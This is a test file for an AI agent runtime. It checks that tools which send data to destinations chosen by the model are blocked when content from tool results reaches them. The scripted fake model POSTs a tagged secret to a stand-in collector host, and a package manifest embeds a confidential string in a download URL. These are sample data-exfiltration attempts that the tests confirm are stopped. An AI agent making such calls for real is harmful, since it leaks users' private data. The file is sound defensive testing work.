/**
 * 0.7.1 — permission-integration#5: every builtin that sends to a place the
 * model chose is a dynamic egress sink, so content from a tool result, an MCP
 * server or a sub-agent reaching it is BLOCKED, as it is for Fetch.
 *
 * `defaultSinkScope` reads the tool's declaration (`hasModelChosenDestination`:
 * external, with a `url` or `recipient` operative field) instead of a list of
 * names. This checks the result over the live registry, the sinks the audit
 * named, and one of them end to end through the run loop.
 */
import { beforeAll, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, realpathSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import type { ProviderAdapter } from "@crewhaus/adapter-anthropic";
import type { EgressMatcher } from "@crewhaus/egress-classifier";
import { type TrustOrigin, createRunContext } from "@crewhaus/run-context";
import { defaultSinkScope, runChatLoop } from "@crewhaus/runtime-core";
import { type RegisteredTool, hasModelChosenDestination } from "@crewhaus/tool-catalog";
import { _setFetch as _setDistributionFetch } from "@crewhaus/tool-distribution";
import { glob as globTool } from "@crewhaus/tool-fs";
import type { TraceEvent } from "@crewhaus/trace-event-bus";
import { loadAllBuiltinTools } from "./builtin-tools-for-tests";

type Loaded = { readonly tool: RegisteredTool; readonly pkg: string };
let external: ReadonlyArray<Loaded>;
beforeAll(async () => {
  const { tools, packageOf } = await loadAllBuiltinTools();
  external = tools
    .filter((tool) => tool.scope === "external")
    .map((tool) => ({ tool, pkg: packageOf.get(tool.name) ?? "?" }));
}, 60_000);

const scopeOf = (name: string) => {
  const found = external.find((e) => e.tool.name === name)?.tool;
  if (found === undefined) throw new Error(`no external builtin named ${name}`);
  return defaultSinkScope(found.name, found);
};

describe("which builtins are dynamic sinks", () => {
  test("the sinks the audit found warning where Fetch blocks now block", () => {
    for (const name of [
      "Fetch",
      "WebFetch",
      "HttpRequest",
      "HttpBatch",
      "GraphqlQuery",
      "WebhookPost",
      "EmailSend",
      "SmsSend",
      "PushNotify",
      "ChatPost",
      "IssueComment",
      "DownloadFile",
      "OpenExternal",
      "HttpPaginate",
      "EvmGetBlock",
    ]) {
      expect({ name, scope: scopeOf(name) }).toEqual({ name, scope: "external-dynamic" });
    }
  });

  test("fixed-destination sinks stay configured", () => {
    for (const name of [
      "WebSearch",
      "ImageGenerate",
      // A command line names no destination field; classifying the shell as
      // dynamic would block every command that mentions a file it was shown.
      "Bash",
      "RunCommand",
      "IssueGet",
      "GitStatus",
      "SendMessage",
    ]) {
      expect({ name, scope: scopeOf(name) }).toEqual({ name, scope: "external-configured" });
    }
  });

  test("the dynamic set is the declared one, and it is not small", () => {
    // Hit count for the derivation: every external builtin with a url or
    // recipient operative argument, which is what defaultSinkScope reads.
    const dynamic = external.filter(({ tool }) => hasModelChosenDestination(tool));
    expect(dynamic.length).toBeGreaterThanOrEqual(45);
    for (const { tool } of dynamic) {
      expect({ name: tool.name, scope: defaultSinkScope(tool.name, tool) }).toEqual({
        name: tool.name,
        scope: "external-dynamic",
      });
    }
  });

  /**
   * The audit's suggested guard: an external tool with a field named like a
   * destination must declare it, so the classification above cannot miss it.
   * The exemptions are fields whose destination the operator fixes, each
   * with the reason; the test fails if one stops being used.
   */
  const DESTINATION_FIELD = /^(url|urls|rpcUrl|baseUrl|apiBaseUrl|to|target|peers|host|endpoint)$/;
  const OPERATOR_FIXED: Readonly<Record<string, string>> = {
    "@crewhaus/tool-codehost#baseUrl":
      "an API root whose origin must be allow-listed; the tool writes every path itself",
    "@crewhaus/tool-codehost#host": "the API dialect, github or gitlab, not a place",
    "@crewhaus/tool-notify#apiBaseUrl":
      "an API root whose origin must be allow-listed; the channel is the declared destination",
    "@crewhaus/tool-notify#host":
      "the SMTP relay, which must be in allowed_smtp_hosts; the recipients are declared",
    "@crewhaus/tool-fleet#target": "a compile target name, not a place",
  };

  test("an external tool with a destination-shaped field declares it", () => {
    const undeclared: string[] = [];
    const exemptionsUsed = new Set<string>();
    let checked = 0;
    for (const { tool, pkg } of external) {
      const shape = (tool.inputSchema as { shape?: Record<string, unknown> }).shape ?? {};
      const declared = new Set((tool.operativeArgs ?? []).map((a) => a.field.split(".")[0]));
      for (const field of Object.keys(shape)) {
        if (!DESTINATION_FIELD.test(field)) continue;
        checked++;
        if (declared.has(field)) continue;
        const key = `${pkg}#${field}`;
        if (Object.hasOwn(OPERATOR_FIXED, key)) {
          exemptionsUsed.add(key);
          continue;
        }
        undeclared.push(`${tool.name}.${field}`);
      }
    }
    // The sweep's hit count, and every exemption still earns its place.
    expect(external.length).toBeGreaterThanOrEqual(150);
    expect(checked).toBeGreaterThanOrEqual(40);
    expect([...exemptionsUsed].sort()).toEqual(Object.keys(OPERATOR_FIXED).sort());
    expect(undeclared).toEqual([]);
  });

  /**
   * The field-name guard above cannot see a destination carried INSIDE a
   * value: PackageManifestVerify dials every URL written in a manifest's
   * text, and no field of it is named like a URL (C049). So every external
   * tool that reaches the network is held here too: it is a dynamic sink
   * (it declares a `url` or `recipient`), or it is listed with where its
   * destination comes from instead. A new network tool fails until it is one
   * or the other, which is the review that would have caught
   * PackageManifestVerify.
   */
  const CODE_HOST =
    "the configured code host, at an allow-listed origin; the call names a repository there";
  const CHAIN_RPC =
    "the RPC endpoint the operator configured for the chain; the call names what to read there";
  const CONFIGURED_DESTINATION: Readonly<Record<string, string>> = {
    AlertAck: "the operator's configured alerting backend",
    AlertList: "the operator's configured alerting backend",
    ChatDelete: "a message already posted, in the configured chat workspace; it sends no text",
    ChatReact: "a message already posted, in the configured chat workspace; it sends an emoji name",
    CheckRuns: CODE_HOST,
    CompareRefs: CODE_HOST,
    ContractInspect: CHAIN_RPC,
    DefiPositionRead: CHAIN_RPC,
    DeliveryCheck: "the configured notification provider's delivery status",
    EntityRegistryLookup: "fixed public company registries",
    Erc20Balance: CHAIN_RPC,
    EvmBlockNumber: CHAIN_RPC,
    EvmCall: CHAIN_RPC,
    EvmGetBalance: CHAIN_RPC,
    EvmGetLogs: CHAIN_RPC,
    EvmGetTransaction: CHAIN_RPC,
    EvmGetTransactionReceipt: CHAIN_RPC,
    EvmMulticall: CHAIN_RPC,
    EvmSimulate: CHAIN_RPC,
    EvmSimulateBundle: CHAIN_RPC,
    GasMarketRead: CHAIN_RPC,
    ImageGenerate: "the configured image provider",
    IssueGet: CODE_HOST,
    IssueList: CODE_HOST,
    LogsQuery: "the operator's configured log backend",
    MetricsQuery: "the operator's configured metrics backend",
    OraclePriceRead: CHAIN_RPC,
    // Its destinations are written inside the manifests, not in any field,
    // so the runtime's scan of the input cannot tell them apart from the
    // local paths it names. The tool screens each URL it would dial against
    // the run's data lineage instead, as a model-chosen destination (C049).
    PackageManifestVerify:
      "the URLs the manifests name; each is screened against the run's data lineage before it is dialled",
    PortfolioValuation: `${CHAIN_RPC}, and fixed public price providers`,
    PrComments: CODE_HOST,
    PrFiles: CODE_HOST,
    PrGet: CODE_HOST,
    PrList: CODE_HOST,
    PrReviews: CODE_HOST,
    PreflightRun: "binds local ports to see whether they are free; sends nothing anywhere",
    PriceQuote: "fixed public price providers (the ECB, Coinbase)",
    RateLimitStatus: CODE_HOST,
    RegistryOutdated: "fixed public package registries (npm, PyPI, crates.io)",
    RegistryPackageInfo: "fixed public package registries (npm, PyPI, crates.io)",
    RegistrySearch: "fixed public package registries (npm, PyPI, crates.io)",
    ReleaseGet: CODE_HOST,
    ReleaseList: CODE_HOST,
    RepoGet: CODE_HOST,
    Retrieve: "the configured embedder and vector store",
    SearchCode: CODE_HOST,
    SearchIssues: CODE_HOST,
    SendMessage: "the operator's configured channel adapter",
    StatusPagePost: "the operator's configured status page",
    TokenResolve: CHAIN_RPC,
    VatIdValidate: "the fixed VIES service",
    VectorDelete: "the configured vector store",
    WebSearch: "the configured search provider",
    WorkflowRunLogs: CODE_HOST,
    WorkflowRunRerun: CODE_HOST,
    WorkflowRuns: CODE_HOST,
  };

  test("a network tool is a dynamic sink, or says where its destination comes from", () => {
    const network = external.filter(({ tool }) => tool.ioCapability === "network");
    const configured = network
      .filter(({ tool }) => !hasModelChosenDestination(tool))
      .map(({ tool }) => tool.name)
      .sort();
    // The sweep's hit count: both halves are populated.
    expect(network.length).toBeGreaterThanOrEqual(100);
    expect(network.length - configured.length).toBeGreaterThanOrEqual(45);
    expect(configured).toEqual(Object.keys(CONFIGURED_DESTINATION).sort());
    for (const name of configured) {
      expect({ name, scope: scopeOf(name) }).toEqual({ name, scope: "external-configured" });
    }
  });
});

describe("end to end: a tool result reaching HttpRequest is blocked", () => {
  function adapter(input: unknown, name = "HttpRequest"): ProviderAdapter {
    let i = 0;
    return {
      providerId: "anthropic",
      features: {
        caching: "explicit",
        tool_use: true,
        vision: true,
        thinking: true,
        web_search: true,
      },
      estimateTokens: () => 0,
      stream: () => {
        const first = i++ === 0;
        return (async function* () {
          yield { kind: "message_start" } as const;
          yield {
            kind: "content_block_start",
            index: 0,
            block: first
              ? { type: "tool_use", id: "tu_1", name, input: {} }
              : { type: "text", text: "" },
          } as const;
          yield {
            kind: "content_block_delta",
            index: 0,
            delta: first
              ? { type: "input_json_delta", partial_json: JSON.stringify(input) }
              : { type: "text_delta", text: "done" },
          } as const;
          yield { kind: "content_block_stop", index: 0 } as const;
          yield {
            kind: "message_delta",
            stopReason: first ? "tool_use" : "end_turn",
            usage: { input: 1, output: 1 },
          } as const;
          yield { kind: "message_stop" } as const;
        })();
      },
    };
  }

  test("the egress verdict is block, and the request is never made", async () => {
    const httpRequest = external.find((e) => e.tool.name === "HttpRequest")?.tool as RegisteredTool;
    let executed = false;
    const spy: RegisteredTool = {
      ...httpRequest,
      execute: async () => {
        executed = true;
        return "sent";
      },
    };
    const runContext = createRunContext();
    runContext.dataLineage = new Map<string, TrustOrigin>([["tool-result-secret-value", "tool"]]);
    const events: TraceEvent[] = [];
    runContext.eventBus.subscribe((e) => events.push(e));
    // Whether the payload carries tagged content is the matcher's call; this
    // one says it does, so the test is about the tier the sink lands in.
    const matcher: EgressMatcher = {
      name: "spy",
      match: () => ({ originsFound: ["tool"], matchCount: 1 }),
    };
    await runChatLoop({
      model: "test-model",
      instructions: "post the report",
      runContext,
      singleTurn: true,
      seedMessages: [{ role: "user", content: "go" }],
      permissionMode: "bypass",
      tools: [spy],
      egressMatcher: matcher,
      _adapter: adapter({
        url: "https://collector.example/in",
        method: "POST",
        body: "tool-result-secret-value",
        justification: "post the report to the collector",
      }),
    });
    const egress = events.find(
      (e): e is Extract<TraceEvent, { kind: "permission_decision" }> =>
        e.kind === "permission_decision" && (e.reason?.startsWith("egress:") ?? false),
    );
    expect(egress?.outcome).toBe("egress-blocked");
    expect(executed).toBe(false);
  });

  test("PackageManifestVerify does not download a URL carrying a tool result's text (C049)", async () => {
    const pmv = external.find((e) => e.tool.name === "PackageManifestVerify")
      ?.tool as RegisteredTool;
    const wire: string[] = [];
    _setDistributionFetch(async (req) => {
      wire.push(req.url);
      return new Response("x", { status: 200 });
    });
    const secret = "internal-doc-7f3a9c Q3 acquisition target";
    const ws = realpathSync(mkdtempSync(join(tmpdir(), "pmv-egress-")));
    const cwd = process.cwd();
    const run = async (mode: "plan" | "auto", input: unknown) => {
      const runContext = createRunContext();
      runContext.dataLineage = new Map<string, TrustOrigin>([[secret, "tool"]]);
      const events: TraceEvent[] = [];
      runContext.eventBus.subscribe((e) => events.push(e));
      const seen: unknown[] = [];
      await runChatLoop({
        model: "test-model",
        instructions: "verify the release manifest",
        runContext,
        singleTurn: true,
        seedMessages: [{ role: "user", content: "go" }],
        permissionMode: mode,
        tools: [pmv],
        _adapter: stepsAdapter([["PackageManifestVerify", input]], seen),
      });
      return { outcomes: outcomesOf(events, "PackageManifestVerify"), result: resultOf(seen) };
    };
    try {
      process.chdir(ws);
      const tagged = formula(`?d=${encodeURIComponent(secret)}`);
      mkdirSync(join(ws, "packaging"));
      writeFileSync(join(ws, "packaging", "tagged.rb"), tagged);
      for (const mode of ["plan", "auto"] as const) {
        // Written inline, or in a file the call names: the URL it would dial
        // carries the tagged text, so it is not fetched and the row says why.
        for (const input of [
          { manifests: [{ text: tagged }] },
          { paths: ["packaging/tagged.rb"] },
        ]) {
          const { outcomes, result } = await run(mode, input);
          expect({ mode, input, blocked: result.includes('"reason":"egressBlocked"') }).toEqual({
            mode,
            input,
            blocked: true,
          });
          expect(outcomes).not.toContain("deny");
        }
      }
      expect(wire).toEqual([]);
      // Control: a manifest carrying nothing a tool returned is fetched.
      const clean = await run("auto", { manifests: [{ text: formula("") }] });
      expect(clean.result).not.toContain("egressBlocked");
      expect(wire).toEqual(["https://example.com/foo-1.0.0.tar.gz"]);
    } finally {
      process.chdir(cwd);
      rmSync(ws, { recursive: true, force: true });
      _setDistributionFetch(undefined);
    }
  });

  test("PackageManifestVerify runs on a manifest another tool listed, and download:false dials nothing", async () => {
    // Glob lists packaging/homebrew/crewhaus.rb; verifying that file is the
    // ordinary flow, and the path names nothing the tool sends anywhere. It
    // was egress-blocked in every mode while the whole input was scanned as a
    // model-chosen destination.
    const pmv = external.find((e) => e.tool.name === "PackageManifestVerify")
      ?.tool as RegisteredTool;
    const wire: string[] = [];
    _setDistributionFetch(async (req) => {
      wire.push(req.url);
      return new Response("x", { status: 200 });
    });
    const ws = realpathSync(mkdtempSync(join(tmpdir(), "pmv-glob-")));
    const cwd = process.cwd();
    try {
      process.chdir(ws);
      mkdirSync(join(ws, "packaging", "homebrew"), { recursive: true });
      writeFileSync(join(ws, "packaging", "homebrew", "crewhaus.rb"), formula(""));
      for (const mode of ["plan", "auto"] as const) {
        for (const download of [true, false]) {
          wire.length = 0;
          const runContext = createRunContext();
          const events: TraceEvent[] = [];
          runContext.eventBus.subscribe((e) => events.push(e));
          await runChatLoop({
            model: "test-model",
            instructions: "verify the release manifests",
            runContext,
            singleTurn: true,
            seedMessages: [{ role: "user", content: "verify the homebrew formula in this repo" }],
            permissionMode: mode,
            tools: [globTool, pmv],
            _adapter: stepsAdapter([
              ["Glob", { pattern: "**/*.rb" }],
              ["PackageManifestVerify", { paths: ["packaging/homebrew/crewhaus.rb"], download }],
            ]),
          });
          const outcomes = outcomesOf(events, "PackageManifestVerify");
          expect({ mode, download, blocked: outcomes.includes("egress-blocked") }).toEqual({
            mode,
            download,
            blocked: false,
          });
          expect({ mode, download, wire }).toEqual({
            mode,
            download,
            wire: download ? ["https://example.com/foo-1.0.0.tar.gz"] : [],
          });
        }
      }
    } finally {
      process.chdir(cwd);
      rmSync(ws, { recursive: true, force: true });
      _setDistributionFetch(undefined);
    }
  });
});

/** A Homebrew formula whose one download URL ends in `query`. */
function formula(query: string): string {
  return `class Foo < Formula\n  desc "x"\n  homepage "https://example.com"\n  version "1.0.0"\n  url "https://example.com/foo-1.0.0.tar.gz${query}"\n  sha256 "${"a".repeat(64)}"\nend\n`;
}

function outcomesOf(events: ReadonlyArray<TraceEvent>, toolName: string): string[] {
  return events.flatMap((e) =>
    e.kind === "permission_decision" && e.toolName === toolName ? [e.outcome ?? e.decision] : [],
  );
}

/** The text of the last tool result the model was shown. */
function resultOf(requests: ReadonlyArray<unknown>): string {
  let out = "";
  for (const messages of requests) {
    for (const m of (messages as Array<{ content?: unknown }>) ?? []) {
      if (!Array.isArray(m.content)) continue;
      for (const b of m.content as Array<{ type?: string; content?: unknown }>) {
        if (b.type !== "tool_result") continue;
        out = typeof b.content === "string" ? b.content : JSON.stringify(b.content ?? "");
      }
    }
  }
  return out;
}

/** A model that makes each call in turn, then stops; `seen` records what it was sent. */
function stepsAdapter(
  steps: ReadonlyArray<[string, unknown]>,
  seen: unknown[] = [],
): ProviderAdapter {
  let i = 0;
  return {
    providerId: "anthropic",
    features: {
      caching: "explicit",
      tool_use: true,
      vision: true,
      thinking: true,
      web_search: true,
    },
    estimateTokens: () => 0,
    stream: (req) => {
      seen.push((req as { messages?: unknown }).messages);
      const step = steps[i++];
      return (async function* () {
        yield { kind: "message_start" } as const;
        yield {
          kind: "content_block_start",
          index: 0,
          block:
            step !== undefined
              ? { type: "tool_use", id: `tu_${i}`, name: step[0], input: {} }
              : { type: "text", text: "" },
        } as const;
        yield {
          kind: "content_block_delta",
          index: 0,
          delta:
            step !== undefined
              ? { type: "input_json_delta", partial_json: JSON.stringify(step[1]) }
              : { type: "text_delta", text: "done" },
        } as const;
        yield { kind: "content_block_stop", index: 0 } as const;
        yield {
          kind: "message_delta",
          stopReason: step !== undefined ? "tool_use" : "end_turn",
          usage: { input: 1, output: 1 },
        } as const;
        yield { kind: "message_stop" } as const;
      })();
    },
  };
}
